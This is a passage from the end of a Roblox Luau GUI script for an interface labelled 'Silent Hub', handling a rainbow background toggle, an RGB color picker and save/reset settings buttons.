		r = math.clamp(r, 0, 255)
		g = math.clamp(g, 0, 255)
		b = math.clamp(b, 0, 255)
	
		frame.BackgroundColor3 = Color3.fromRGB(r, g, b)
	end
	
	task.spawn(function()
		if game.RunService:IsStudio() then
			if not game:IsLoaded() then
				game.Loaded:Wait()
			end
			
			wait(2)
		end
		attach()
	end)
	
	if beta == true then
		maincontainer.Header.TextLabel.Text = "Silent Hub BETA"
	end
	
	local previouscolor = Color3.new(50/255, 50/255, 50/255)
	
	rainbowtoggle.MouseButton1Click:Connect(function()
		rainbowenabled.Value = not rainbowenabled.Value
	
		if rainbowenabled.Value then
			previouscolor = maincontainer.BackgroundColor3
			task.spawn(rainbow)
		else
			if rainbowtween then
				rainbowtween:Cancel()
			end
	
			maincontainer.BackgroundColor3 = previouscolor
		end
	end)
	
	cancelbutton.MouseButton1Click:Connect(function()
		colorpick.Enabled = not colorpick.Enabled
		maincontainer.BackgroundColor3 = pickerpreviouscolor
	
		red.Text = tostring(math.floor(pickerpreviouscolor.R * 255))
		green.Text = tostring(math.floor(pickerpreviouscolor.G * 255))
		blue.Text = tostring(math.floor(pickerpreviouscolor.B * 255))
	end)
	
	okbutton.MouseButton1Click:Connect(function()
		colorpick.Enabled = not colorpick.Enabled
	end)
	
	colorpick:GetPropertyChangedSignal("Enabled"):Connect(function()
		if colorpick.Enabled == true then
			pickerpreviouscolor = maincontainer.BackgroundColor3 
		end
	end)
	
	
	pickerbackground:GetPropertyChangedSignal("Value"):Connect(function()
		if pickerbackground.Value == true then
			if #pickerconnections == 0 then
				table.insert(pickerconnections, red:GetPropertyChangedSignal("Text"):Connect(function()
					colorset(colorpick.ColorPicker.Content)
				end))
	
				table.insert(pickerconnections, green:GetPropertyChangedSignal("Text"):Connect(function()
					colorset(colorpick.ColorPicker.Content)
				end))
	
				table.insert(pickerconnections, blue:GetPropertyChangedSignal("Text"):Connect(function()
					colorset(colorpick.ColorPicker.Content)
				end))
			end
		else
			for _, connection in ipairs(pickerconnections) do
				connection:Disconnect()
			end
			table.clear(pickerconnections)
			colorpick.ColorPicker.Content.BackgroundColor3 = Color3.fromRGB(64, 64, 64)
		end
	end)
	
	savebutton.MouseButton1Click:Connect(savesettings)
	resetbutton.MouseButton1Click:Connect(resetsettings)
	
	red:GetPropertyChangedSignal("Text"):Connect(function()
		colorset(maincontainer)
	end)
	
	green:GetPropertyChangedSignal("Text"):Connect(function()
		colorset(maincontainer)
	end)
	
	blue:GetPropertyChangedSignal("Text"):Connect(function()
		colorset(maincontainer)
	end)
end;
task.spawn(C_c7);

return G2L["1"], require;
